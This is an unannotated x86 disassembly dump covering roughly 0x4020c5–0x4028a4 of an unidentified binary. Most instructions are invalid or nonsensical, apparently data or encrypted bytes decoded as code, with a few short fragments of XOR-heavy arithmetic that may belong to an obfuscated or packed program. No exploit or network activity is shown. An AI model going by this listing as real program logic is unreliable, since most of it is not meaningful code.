  4020c5:	scas   eax,DWORD PTR es:[edi]
  4020c6:	or     esi,esp
  4020c8:	mov    bl,0x34
  4020ca:	and    al,0xb7
  4020cc:	add    esp,ebx
  4020ce:	dec    esi
  4020cf:	jbe    0x402133
  4020d1:	xchg   ebp,eax
  4020d2:	call   0x1b382f8b
  4020d7:	push   ss
  4020d8:	inc    esi
  4020d9:	sahf   
  4020da:	ins    BYTE PTR es:[edi],dx
  4020db:	sbb    BYTE PTR [ebp-0x24d03022],cl
  4020e1:	cmp    DWORD PTR [esi],eax
  4020e3:	jne    0x402136
  4020e5:	sub    ch,BYTE PTR [ecx+0x7d]
  4020e8:	mov    ds:0x314c8ce5,al
  4020ed:	xchg   ecx,eax
  4020ee:	sub    ah,ch
  4020f0:	bound  eax,QWORD PTR [eax+0x19]
  4020f3:	jae    0x4020f4
  4020f5:	pop    esi
  4020f6:	sbb    DWORD PTR [edi-0x65806aa0],0xffffffcd
  4020fd:	out    0x3a,al
  4020ff:	sbb    al,dh
  402101:	inc    ebx
  402102:	std    
  402103:	mov    ah,0x28
  402105:	sbb    ebx,DWORD PTR [ebx]
  402107:	ss ret 
  402109:	and    ebp,DWORD PTR [eax]
  40210b:	out    0xc5,al
  40210d:	dec    ecx
  40210e:	pop    ebx
  40210f:	popf   
  402110:	xchg   edi,eax
  402111:	fbstp  TBYTE PTR [esi]
  402113:	ficomp WORD PTR [edi+0x6b80b265]
  402119:	(bad)  
  40211a:	out    dx,eax
  40211b:	dec    eax
  40211c:	popa   
  40211d:	mov    WORD PTR [edx],gs
  40211f:	dec    ecx
  402120:	mov    bl,BYTE PTR [ebx+0x9390e0]
  402126:	in     eax,dx
  402127:	dec    esp
  402128:	cs or  al,0xad
  40212b:	je     0x4020c6
  40212d:	shl    BYTE PTR [eax+0x6335d9f3],1
  402133:	psrad  mm4,QWORD PTR [ebx-0x5a2e4f56]
  40213a:	fld    QWORD PTR [edi]
  40213c:	ins    DWORD PTR es:[edi],dx
  40213d:	jo     0x4021a4
  40213f:	fdivr  st(3),st
  402141:	adc    al,BYTE PTR [edi-0x6fa42bee]
  402147:	test   al,0xbe
  402149:	push   ds
  40214a:	out    dx,eax
  40214b:	lahf   
  40214c:	or     ebx,ecx
  40214e:	ror    DWORD PTR [esi],0xc6
  402151:	xchg   esi,eax
  402152:	out    dx,al
  402153:	dec    esi
  402154:	lds    edx,FWORD PTR [eax+0x65]
  402157:	test   DWORD PTR [edx],eax
  402159:	mov    esi,0x35f3574c
  40215e:	lock aas 
  402160:	and    al,0x18
  402162:	mov    bl,0x2f
  402164:	dec    esp
  402165:	pop    esi
  402166:	dec    esp
  402167:	jno    0x4021de
  402169:	mov    al,0xd1
  40216b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40216c:	mov    eax,ds:0x3ff2c319
  402171:	pop    ecx
  402172:	jmp    0xcf971f53
  402177:	das    
  402178:	sbb    ah,ah
  40217a:	mov    ebp,0x107efd8e
  40217f:	shr    ch,0xa6
  402182:	jl     0x4021c3
  402184:	mov    dh,0xfa
  402186:	mov    ebx,DWORD PTR [ecx-0x5cd0e562]
  40218c:	adc    eax,0x2d72527c
  402191:	ror    BYTE PTR [ebx+0x2664a874],cl
  402197:	dec    eax
  402198:	(bad)  
  40219a:	repnz mov BYTE PTR [eax+edi*8-0xabffe50],bl
  4021a2:	adc    ecx,DWORD PTR [ebx+0x7a]
  4021a5:	jmp    0xff73:0x20f16c08
  4021ac:	ret    0x13b9
  4021af:	call   0xab49:0x980311e6
  4021b6:	int    0xca
  4021b8:	fidivr DWORD PTR [ebx]
  4021ba:	push   0xf7c6ac30
  4021bf:	gs pop edi
  4021c1:	inc    edx
  4021c2:	ja     0x40218b
  4021c4:	fldenv [esi+0x13023faa]
  4021ca:	jno    0x40219a
  4021cc:	cmp    esi,ebp
  4021ce:	xchg   ebp,eax
  4021cf:	(bad)  
  4021d0:	sub    eax,0xf176cd42
  4021d5:	pusha  
  4021d6:	out    dx,eax
  4021d7:	arpl   di,bp
  4021d9:	sti    
  4021da:	add    al,BYTE PTR [eax-0x3276b774]
  4021e0:	das    
  4021e1:	loopne 0x40221c
  4021e3:	jl     0x402224
  4021e5:	es clc 
  4021e7:	pop    ds
  4021e8:	(bad)  
  4021e9:	jmp    0x402183
  4021eb:	lods   eax,DWORD PTR ds:[esi]
  4021ec:	add    al,0xd9
  4021ee:	adc    DWORD PTR [esi-0x76c714bf],esp
  4021f4:	cmp    eax,0xb992fb3c
  4021f9:	(bad)  
  4021fa:	out    dx,eax
  4021fb:	clc    
  4021fc:	in     al,dx
  4021fd:	in     al,dx
  4021fe:	jne    0x402230
  402200:	dec    eax
  402201:	mov    eax,0x8fd03d46
  402206:	push   0x45e63a8e
  40220b:	adc    eax,DWORD PTR [ebp+0x7a]
  40220e:	not    BYTE PTR [esi+0xb50a20f]
  402214:	les    ecx,FWORD PTR [edi-0xd]
  402217:	xor    esi,DWORD PTR [ebx-0x4d207417]
  40221d:	aam    0xc8
  40221f:	add    DWORD PTR [ebx],ecx
  402221:	jl     0x4021bf
  402223:	or     DWORD PTR [ebp+0x6c],esp
  402226:	mov    eax,0xcf80514d
  40222b:	mov    al,0xd3
  40222d:	jbe    0x4021f7
  40222f:	add    BYTE PTR [ebp-0x74],cl
  402232:	pop    ss
  402233:	dec    ebp
  402234:	ds std 
  402236:	jns    0x4021c8
  402238:	push   ecx
  402239:	popf   
  40223a:	mov    bl,0xdd
  40223c:	dec    esi
  40223d:	fadd   DWORD PTR [esi]
  40223f:	mov    bl,BYTE PTR [edi-0x754608f]
  402245:	icebp  
  402246:	fistp  QWORD PTR [edx+0x7089517c]
  40224c:	jp     0x40222d
  40224e:	(bad)  [esi-0x6462019]
  402254:	setbe  BYTE PTR [edi+0x573a6697]
  40225b:	pusha  
  40225c:	shr    BYTE PTR [eax+0xb],cl
  40225f:	mov    BYTE PTR [ebp-0x84d10fe],ah
  402265:	pop    esp
  402266:	pop    ss
  402267:	data16 imul ah
  40226a:	mov    al,0xf3
  40226c:	dec    ecx
  40226d:	test   ebp,edi
  40226f:	jge    0x402286
  402271:	aad    0x23
  402273:	jmp    FWORD PTR [edi+0x56dae02f]
  402279:	sub    ah,BYTE PTR [esi]
  40227b:	and    edi,DWORD PTR [eax+0x2e86dfc6]
  402281:	fs (bad) 
  402283:	jmp    0x19dd:0x53f69e4c
  40228a:	cdq    
  40228b:	(bad)  
  40228c:	ret    
  40228d:	paddsw mm0,QWORD PTR [ebx+0x21]
  402291:	sti    
  402292:	cmp    DWORD PTR [ebx+0x78],0xffffffe7
  402296:	cmp    DWORD PTR [edx],ebx
  402298:	int    0x26
  40229a:	cwde   
  40229b:	push   edi
  40229c:	pop    eax
  40229d:	int3   
  40229e:	dec    eax
  40229f:	jg     0x40230c
  4022a1:	sub    ch,dl
  4022a3:	aaa    
  4022a4:	jle    0x4022d9
  4022a6:	mov    BYTE PTR [ecx+0x42a77125],0x0
  4022ad:	mov    ch,0xa7
  4022af:	inc    edx
  4022b0:	add    BYTE PTR [ebx],al
  4022b2:	(bad)  
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a835,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0x5e682c5b
  4022e1:	(bad)
  4022e4:	add    al,0x9
  4022e6:	js     0x402360
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x402366
  4022ed:	cmp    esi,DWORD PTR [edi-0x5c10be74]
  4022f3:	cmp    bl,BYTE PTR [ecx+0x2f4a3dad]
  4022f9:	mov    al,0x57
  4022fb:	jmp    0x32c1:0x74dcf171
  402302:	in     eax,0xcf
  402304:	(bad)  
  402305:	xchg   ecx,eax
  402306:	ins    BYTE PTR es:[edi],dx
  402307:	add    al,0x19
  402309:	jl     0x402353
  40230b:	and    dh,BYTE PTR [edx+0x7decbc18]
  402311:	ja     0x402310
  402313:	xor    DWORD PTR [edi],edx
  402315:	adc    eax,0x7116156b
  40231a:	lds    ebx,FWORD PTR [ebp+0x25282bd0]
  402320:	mov    dh,dh
  402322:	inc    edx
  402323:	jle    0x4022d6
  402325:	(bad)  [ecx]
  402327:	(bad)  
  402328:	(bad)  
  402329:	sbb    eax,0xac6e2e6a
  40232e:	sub    DWORD PTR [ebx],0xe80dcba3
  402334:	push   ecx
  402335:	adc    ecx,edi
  402337:	stc    
  402338:	jge    0x402398
  40233a:	or     bl,BYTE PTR [edi+0x11b028cd]
  402340:	add    esi,ecx
  402342:	xor    eax,0x18dce32
  402347:	mov    eax,0x482264d1
  40234c:	daa    
  40234d:	test   al,0xbf
  40234f:	cld    
  402350:	or     BYTE PTR [ecx],al
  402352:	cdq    
  402353:	lods   eax,DWORD PTR ds:[esi]
  402354:	mov    eax,ds:0x737ac2b6
  402359:	jae    0x402325
  40235b:	pop    eax
  40235c:	pop    ecx
  40235d:	shl    DWORD PTR [ebp-0x10],0xfe
  402361:	ins    BYTE PTR es:[edi],dx
  402362:	shl    DWORD PTR [esi+0x6c28d96f],cl
  402368:	mul    BYTE PTR [edx]
  40236a:	mov    bl,0xe5
  40236c:	idiv   BYTE PTR [edi-0x59]
  40236f:	mov    eax,0x8dcc56fe
  402374:	sub    eax,0x8745981a
  402379:	xchg   ecx,eax
  40237a:	cli    
  40237b:	mov    ebx,DWORD PTR [edx+0x6fb8d6ab]
  402381:	pop    edi
  402382:	ins    BYTE PTR es:[edi],dx
  402383:	pop    edx
  402384:	push   edx
  402385:	mov    ds:0xb5921f55,eax
  40238a:	xchg   esi,eax
  40238b:	jbe    0x247a7abd
  402391:	pop    ss
  402392:	xchg   edi,eax
  402393:	jmp    0x30a5:0xcafadbf9
  40239a:	push   esi
  40239b:	pop    edx
  40239c:	popf   
  40239d:	mov    eax,ds:0xac662b78
  4023a2:	lahf   
  4023a3:	jp     0x402352
  4023a5:	(bad)  
  4023a6:	fnsave [eax]
  4023a8:	call   0x94d4:0x75456681
  4023af:	mov    al,0xd9
  4023b1:	pop    ebp
  4023b2:	daa    
  4023b3:	xchg   BYTE PTR [edx+0x26],al
  4023b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023b8:	jo     0x4023ee
  4023ba:	retf   0x7b10
  4023bd:	(bad)  
  4023be:	aaa    
  4023bf:	ror    BYTE PTR [ecx-0x2d],cl
  4023c2:	jo     0x402349
  4023c4:	sbb    DWORD PTR [edi-0x292c21c1],eax
  4023ca:	jnp    0x402350
  4023cc:	push   ebx
  4023cd:	int    0x58
  4023cf:	out    0x67,al
  4023d1:	aas    
  4023d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023d3:	in     eax,0x87
  4023d5:	scas   al,BYTE PTR es:[edi]
  4023d6:	mul    BYTE PTR [esi+esi*4+0x7e75e883]
  4023dd:	xor    al,0x55
  4023df:	fcmove st,st(5)
  4023e1:	int3   
  4023e2:	sti    
  4023e3:	mov    eax,0xe7ea93e7
  4023e8:	popa   
  4023e9:	lea    ebx,[eax+0x2c0b735]
  4023ef:	shr    BYTE PTR [edi+0xae2ebbc],1
  4023f5:	cmp    BYTE PTR [ebx],al
  4023f7:	sbb    bl,BYTE PTR [edx+0x3a267eb2]
  4023fd:	sbb    bl,ch
  4023ff:	pop    ecx
  402400:	mov    al,0x15
  402402:	dec    esp
  402403:	pop    esp
  402404:	push   eax
  402405:	(bad)  
  402406:	dec    esi
  402407:	pop    ss
  402408:	jno    0x40243e
  40240a:	sbb    BYTE PTR [eax+0x466ca17],ah
  402410:	int    0x73
  402412:	mov    dh,BYTE PTR [edx-0x34]
  402415:	sub    DWORD PTR [ebp-0x2c],edx
  402418:	je     0x4023e6
  40241a:	inc    ebp
  40241b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40241c:	push   ebp
  40241d:	push   ds
  40241e:	push   ss
  40241f:	retf   
  402420:	out    0xe7,al
  402422:	jnp    0x402458
  402424:	xchg   ebx,ebp
  402426:	push   ss
  402427:	lods   al,BYTE PTR ds:[esi]
  402428:	fchs   
  40242a:	or     ch,BYTE PTR [edx+0x7496cdaf]
  402430:	xchg   esp,eax
  402431:	mov    bh,0x24
  402433:	imul   edx,DWORD PTR [ecx],0x4f71ed08
  402439:	mov    bh,0x98
  40243b:	adc    BYTE PTR [edi+ebp*4],0x83
  40243f:	pop    es
  402440:	aam    0x77
  402442:	push   ebp
  402443:	xlat   BYTE PTR ds:[ebx]
  402444:	sbb    DWORD PTR [ecx+0x3db21a4d],eax
  40244a:	push   esp
  40244b:	in     al,0xec
  40244d:	fistp  DWORD PTR [edx-0xe]
  402450:	ds (bad) 
  402452:	neg    BYTE PTR [esi-0x6d]
  402455:	js     0x402482
  402457:	fisubr DWORD PTR ss:[edi]
  40245a:	mov    bl,0x37
  40245c:	arpl   ax,dx
  40245e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40245f:	aas    
  402460:	inc    ecx
  402461:	push   eax
  402462:	out    dx,eax
  402463:	mov    ecx,0x86a4285b
  402468:	hlt    
  402469:	sub    al,0xfd
  40246b:	out    0x3c,eax
  40246d:	adc    DWORD PTR [ebp-0x7f],edx
  402470:	sti    
  402471:	jl     0x402480
  402473:	xor    edi,DWORD PTR [edi+0x7e]
  402476:	in     al,dx
  402477:	push   0xffffffe8
  402479:	lods   eax,DWORD PTR ds:[esi]
  40247a:	mov    ds:0xe1fa55a5,al
  40247f:	jp     0x4024ac
  402481:	repz adc al,0x5f
  402484:	mov    ch,0x62
  402486:	daa    
  402487:	mov    eax,ds:0x5015229b
  40248c:	mov    esp,DWORD PTR [ecx+0x6e342a8f]
  402492:	add    DWORD PTR [esp+eax*8+0x35],0x73a170c9
  40249a:	xchg   DWORD PTR [ebx+0xe9b92c0],ebp
  4024a0:	call   0xf9949c61
  4024a5:	fldenv [edi+0xd]
  4024a8:	cmp    eax,0xf11f46a8
  4024ad:	ficomp DWORD PTR [ebp-0xa]
  4024b0:	xchg   ebx,eax
  4024b1:	popf   
  4024b2:	in     al,0xae
  4024b4:	outs   dx,DWORD PTR ds:[esi]
  4024b5:	in     eax,0x6f
  4024b7:	inc    ebp
  4024b8:	cmp    BYTE PTR [ecx+0x63eb4c07],cl
  4024be:	aam    0xba
  4024c0:	jnp    0x402539
  4024c2:	pop    esi
  4024c3:	pushf  
  4024c4:	daa    
  4024c5:	nop
  4024c6:	inc    edi
  4024c7:	sbb    DWORD PTR [ecx],edi
  4024c9:	fst    st(7)
  4024cb:	(bad)
  4024cf:	retf   
  4024d0:	dec    ebp
  4024d1:	jmp    0x402545
  4024d3:	out    dx,al
  4024d4:	idiv   bh
  4024d6:	out    0x98,ax
  4024d9:	leave  
  4024da:	mov    ecx,edi
  4024dc:	xchg   esp,eax
  4024dd:	sub    ebp,DWORD PTR [ecx-0x4163ec31]
  4024e3:	inc    esp
  4024e4:	not    dl
  4024e6:	inc    edi
  4024e7:	pop    esp
  4024e8:	ror    edx,cl
  4024ea:	ss popa 
  4024ec:	push   cs
  4024ed:	inc    ebp
  4024ee:	pop    ebp
  4024ef:	push   ss
  4024f0:	rcl    DWORD PTR [eax-0x6015941b],1
  4024f6:	in     al,0xc2
  4024f8:	iret   
  4024f9:	xor    eax,0x56206dd
  4024fe:	loope  0x402507
  402500:	cld    
  402501:	cs push esi
  402503:	jp     0x4024e0
  402505:	push   cs
  402506:	fsubr  QWORD PTR [edx]
  402508:	pop    edx
  402509:	and    bh,BYTE PTR [edx]
  40250b:	pop    ds
  40250c:	lods   eax,DWORD PTR ds:[esi]
  40250d:	dec    ebp
  40250e:	bound  esp,QWORD PTR [eax+edi*8+0x16af85b6]
  402515:	in     eax,dx
  402516:	vorpd  ymm4,ymm3,ymm1
  40251a:	inc    edi
  40251b:	cmp    eax,0x1cc02794
  402520:	dec    ecx
  402521:	cld    
  402522:	sar    DWORD PTR [ecx-0x1a],1
  402525:	jl     0x402514
  402527:	(bad)  
  402528:	adc    ah,BYTE PTR [eax-0x4054ebb9]
  40252e:	jbe    0x402561
  402530:	mov    esi,0x72db8cbf
  402535:	scas   eax,DWORD PTR es:[edi]
  402536:	jg     0x4025aa
  402538:	mov    gs,WORD PTR [eax+0x1c]
  40253b:	mov    eax,ds:0xd96a607f
  402540:	pop    edi
  402541:	mov    cl,0xc6
  402543:	loopne 0x402536
  402545:	dec    eax
  402546:	mov    dh,0x86
  402548:	jl     0x402593
  40254a:	cmp    BYTE PTR [ecx],dh
  40254c:	stos   DWORD PTR es:[edi],eax
  40254d:	stc    
  40254e:	dec    edx
  40254f:	jg     0x40256d
  402551:	or     BYTE PTR [ebx-0x672d8265],bh
  402557:	dec    edx
  402558:	mul    DWORD PTR [esp+ecx*2+0x53c84be1]
  40255f:	retf   
  402560:	xchg   esp,eax
  402561:	mov    cs,WORD PTR [ebp-0xda4b59]
  402567:	pop    ds
  402568:	(bad)  
  402569:	mov    WORD PTR ds:0x39b41661,?
  40256f:	add    DWORD PTR [edi],ecx
  402571:	test   DWORD PTR [edx+eax*1+0x458b0000],edi
  402578:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	in     al,dx
  402594:	mov    fs,WORD PTR [eax+0x5b]
  402597:	mov    cl,BYTE PTR [edi]
  402599:	js     0x402613
  40259b:	(bad)  
  40259c:	jle    0x402616
  40259e:	js     0x4025ca
  4025a0:	inc    edx
  4025a1:	push   esp
  4025a2:	out    0x52,al
  4025a4:	push   edx
  4025a5:	jmp    0x4025f4
  4025a7:	jg     0x40260b
  4025a9:	inc    esi
  4025aa:	fmul   DWORD PTR [edi-0x391ce3d7]
  4025b0:	cdq    
  4025b1:	jge    0x40262c
  4025b3:	push   cs
  4025b4:	sub    edx,DWORD PTR [eax-0x406913a8]
  4025ba:	out    dx,al
  4025bb:	lods   eax,DWORD PTR ds:[esi]
  4025bc:	lock jb 0x402567
  4025bf:	add    eax,0xa6580502
  4025c4:	dec    edi
  4025c5:	in     eax,0x62
  4025c7:	(bad)  
  4025c8:	pop    ss
  4025c9:	jl     0x40258d
  4025cb:	int    0x59
  4025cd:	and    bl,BYTE PTR [esi]
  4025cf:	inc    ebp
  4025d0:	ins    BYTE PTR es:[edi],dx
  4025d1:	mov    bl,bl
  4025d3:	push   0xffffff9b
  4025d5:	cmc    
  4025d6:	js     0x4025ab
  4025d8:	je     0x402598
  4025da:	pop    ds
  4025db:	fild   WORD PTR [ebp-0x66]
  4025de:	xchg   edi,eax
  4025df:	call   0x43edc32d
  4025e4:	mov    dl,0xbf
  4025e6:	dec    edx
  4025e7:	and    ecx,0xf95592c1
  4025ed:	xchg   edx,eax
  4025ee:	loop   0x4025e1
  4025f0:	(bad)  
  4025f1:	out    dx,al
  4025f2:	add    eax,0x43ca746e
  4025f7:	dec    ecx
  4025f8:	bound  esi,QWORD PTR [ebx]
  4025fa:	jl     0x4025c7
  4025fc:	push   ss
  4025fd:	xor    DWORD PTR [eax-0x5b],edx
  402600:	push   ss
  402601:	out    dx,al
  402602:	mov    ds:0xe21a996f,eax
  402607:	inc    ebp
  402608:	xor    esi,ebp
  40260a:	mov    ds:0x410e7da,eax
  40260f:	sub    ecx,eax
  402611:	int    0xc1
  402613:	(bad)  
  402614:	cmp    ch,bl
  402616:	loop   0x4025a4
  402618:	cld    
  402619:	pop    esi
  40261a:	sbb    ah,BYTE PTR ds:0x80b6e93
  402620:	mov    eax,0xa32ca62e
  402625:	xor    BYTE PTR ds:0x708ba958,dh
  40262b:	es (bad) 
  40262e:	icebp  
  40262f:	push   cs
  402630:	xchg   ebp,eax
  402631:	rep ins DWORD PTR es:[edi],dx
  402633:	jns    0x4025ca
  402635:	mov    esp,0xafdf9bb6
  40263a:	sub    eax,0xa66b1e3
  40263f:	cmp    ah,BYTE PTR [ebx+esi*4+0x18062bb3]
  402646:	int3   
  402647:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  402649:	outs   dx,BYTE PTR ds:[esi]
  40264a:	jle    0x402697
  40264c:	aas    
  40264d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40264e:	repnz mul BYTE PTR [eax-0x57934b4d]
  402655:	fs cmp al,0x27
  402658:	push   edx
  402659:	sub    esp,ebx
  40265b:	xor    al,0x6
  40265d:	fidiv  DWORD PTR [ebx]
  40265f:	sbb    eax,0x8e7069a2
  402664:	push   edx
  402665:	adc    cl,dh
  402667:	or     DWORD PTR [ebx+0x78fdbe6c],ebx
  40266d:	or     eax,0xc16674fa
  402672:	mul    BYTE PTR [eax+eiz*4]
  402675:	pop    edx
  402676:	and    dl,BYTE PTR [ebp-0x6]
  402679:	imul   esp,ecx,0x1c73179f
  40267f:	ins    DWORD PTR es:[edi],dx
  402680:	int3   
  402681:	and    ebp,edx
  402683:	dec    esp
  402684:	and    ah,dh
  402686:	jmp    0x4026aa
  402688:	mov    esp,0xd48ea511
  40268d:	add    eax,eax
  40268f:	daa    
  402690:	and    eax,DWORD PTR [esi+0x7c509cf0]
  402696:	dec    esi
  402697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402698:	pusha  
  402699:	test   al,0xc
  40269b:	std    
  40269c:	dec    esi
  40269d:	xlat   BYTE PTR ds:[ebx]
  40269e:	pop    ds
  40269f:	in     al,dx
  4026a0:	js     0x4026d9
  4026a2:	mov    dh,0xdd
  4026a4:	inc    edi
  4026a5:	dec    esi
  4026a6:	add    ah,BYTE PTR [ecx+ebp*1+0x79]
  4026aa:	dec    esp
  4026ab:	push   ecx
  4026ac:	push   ss
  4026ad:	push   eax
  4026ae:	les    ecx,FWORD PTR [esi]
  4026b0:	fcomp  st(0)
  4026b2:	and    al,0xf5
  4026b4:	fcomp  QWORD PTR [eax]
  4026b6:	push   esi
  4026b7:	pop    esi
  4026b8:	inc    ecx
  4026b9:	add    bh,bl
  4026bb:	dec    edx
  4026bc:	pop    ecx
  4026bd:	js     0x402706
  4026bf:	mov    ecx,0x987cec14
  4026c4:	fwait
  4026c5:	jp     0x4026fe
  4026c7:	in     eax,dx
  4026c8:	popa   
  4026c9:	fs xchg esp,eax
  4026cb:	cmp    bl,BYTE PTR [edx]
  4026cd:	hlt    
  4026ce:	jns    0x40271d
  4026d0:	rcl    DWORD PTR [ebx+0x26],cl
  4026d3:	sbb    DWORD PTR [ecx-0x51],ecx
  4026d6:	outs   dx,BYTE PTR ds:[esi]
  4026d7:	inc    eax
  4026d8:	outs   dx,DWORD PTR ds:[esi]
  4026d9:	sti    
  4026da:	push   edi
  4026db:	xchg   edi,eax
  4026dc:	fst    DWORD PTR [esi+0x3c44dfa0]
  4026e2:	imul   edx,DWORD PTR [esi],0xf68ab114
  4026e8:	je     0x4026fd
  4026ea:	fstp   TBYTE PTR [esi+0xc]
  4026ed:	xor    al,0x80
  4026ef:	pop    edx
  4026f0:	ja     0x402727
  4026f2:	retf   0x5d36
  4026f5:	stc    
  4026f6:	sub    DWORD PTR [eax+edx*4-0x5da945ac],esi
  4026fd:	ds pop edi
  4026ff:	jp     0x4026e7
  402701:	add    edi,DWORD PTR [edx+0x39c96903]
  402707:	push   0xffffffdc
  402709:	fimul  DWORD PTR [ecx+0x2c]
  40270c:	mov    dl,al
  40270e:	sub    eax,0xa9192ac9
  402713:	stos   BYTE PTR es:[edi],al
  402714:	(bad)  
  402715:	clc    
  402716:	in     eax,dx
  402717:	sbb    eax,0xc7d73595
  40271c:	inc    esp
  40271d:	pop    ecx
  40271e:	ror    BYTE PTR [edi],0x84
  402721:	jl     0x4026f8
  402723:	in     eax,0x49
  402725:	jae    0x402749
  402727:	sar    DWORD PTR [esi-0x7393d147],0xd4
  40272e:	neg    DWORD PTR [eax+eiz*2]
  402731:	in     al,0x66
  402733:	pop    edx
  402734:	popa   
  402735:	cmp    DWORD PTR [edx-0x53],0x6b
  402739:	pop    edi
  40273a:	rcr    DWORD PTR [ebp+0x31],0x74
  40273e:	sbb    DWORD PTR [esi],0xed66e806
  402744:	push   ss
  402745:	jle    0x40276f
  402747:	rol    DWORD PTR [ecx-0x57a42d81],1
  40274d:	mov    ds:0x709ace7e,al
  402752:	cmp    esp,DWORD PTR [eax-0x16e9902e]
  402758:	ins    BYTE PTR es:[edi],dx
  402759:	int    0xf1
  40275b:	push   edx
  40275c:	jmp    0xbe16:0x64d2f3d7
  402763:	dec    edx
  402764:	xor    ah,BYTE PTR [ebx]
  402766:	jge    0x402766
  402768:	jp     0x4027a4
  40276a:	(bad)  
  40276c:	clc    
  40276d:	(bad)  
  40276e:	jae    0x4027c8
  402770:	mov    dh,0x5c
  402772:	sbb    bl,0xb
  402775:	in     al,dx
  402776:	and    ch,BYTE PTR [edx+0x14]
  402779:	or     DWORD PTR [ebp+0x65e74424],ecx
  40277f:	lods   al,BYTE PTR ds:[esi]
  402780:	adc    BYTE PTR [edi+0x1e4fa12f],dh
  402786:	hlt    
  402787:	lock (bad) 
  402789:	retf   0xa0db
  40278c:	cmp    ebx,ebx
  40278e:	add    BYTE PTR [ecx+0x8],ah
  402791:	jle    0x4027c3
  402793:	xchg   ecx,eax
  402794:	and    edi,ebp
  402796:	sub    eax,0x84474299
  40279b:	fsub   QWORD PTR [edi]
  40279d:	push   ds
  40279e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40279f:	or     edi,DWORD PTR [ebx]
  4027a1:	in     eax,dx
  4027a2:	jne    0x402822
  4027a4:	mov    esi,0x2234d407
  4027a9:	dec    edi
  4027aa:	sbb    DWORD PTR [ebx+0x12],0x6fad8f42
  4027b1:	jb     0x402799
  4027b3:	mov    ch,0xa4
  4027b5:	jno    0x402807
  4027b7:	pop    edi
  4027b8:	aam    0x83
  4027ba:	jno    0x4027f1
  4027bc:	push   esi
  4027bd:	xchg   ebx,eax
  4027be:	xor    dl,BYTE PTR [edx+0x7f320cae]
  4027c4:	inc    ecx
  4027c5:	jmp    0x4027e6
  4027c7:	shr    BYTE PTR [ebx],0x74
  4027ca:	inc    ebp
  4027cb:	leave  
  4027cc:	and    esp,DWORD PTR [esi+0x14e2d2d6]
  4027d2:	cmp    bh,BYTE PTR [ebx+0x76233a69]
  4027d8:	js     0x4027e2
  4027da:	into   
  4027db:	into   
  4027dc:	les    edi,FWORD PTR [ecx+0x1ed755d6]
  4027e2:	pop    ds
  4027e3:	fadd   QWORD PTR [ebx+ebp*8]
  4027e6:	pop    ebx
  4027e7:	shl    DWORD PTR [eax+0x7ed76437],1
  4027ed:	cmp    bh,ch
  4027ef:	loop   0x4027d6
  4027f1:	xor    cl,BYTE PTR gs:[edi-0x5c]
  4027f5:	pop    es
  4027f6:	mov    WORD PTR [ebx-0x2f],es
  4027f9:	pop    ebx
  4027fa:	pop    edx
  4027fb:	jg     0x4027cf
  4027fd:	push   ecx
  4027fe:	ror    DWORD PTR [ecx],cl
  402800:	fdiv   QWORD PTR ds:0x8ed10807
  402806:	aam    0xed
  402808:	xor    al,0xfe
  40280a:	out    dx,eax
  40280b:	mov    BYTE PTR [edi+0x7a],ah
  40280e:	in     eax,0x4
  402810:	das    
  402811:	sub    al,0xde
  402813:	add    eax,0x6219e926
  402818:	cmp    DWORD PTR [esi],esi
  40281a:	mov    ds:0x245e7d81,al
  40281f:	dec    esp
  402820:	fisttp QWORD PTR [ebx+0x4d8bf045]
  402826:	adc    BYTE PTR [ebx],dh
  402828:	into   
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	push   es
  402882:	and    DWORD PTR [ecx+0x780c0813],ecx
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x4028bc
  40288e:	(bad)  
  40288f:	scas   eax,DWORD PTR es:[edi]
  402890:	popfw  
  402892:	gs imul edi,ebp,0x3f736ea8
  402899:	pop    edx
  40289a:	and    esi,DWORD PTR [ebp+0x77]
  40289d:	xchg   esp,eax
  40289e:	pop    eax
  40289f:	cmp    eax,0xbd834e8c
  4028a4:	inc    BYTE PTR [eax+0x5bebf64b]
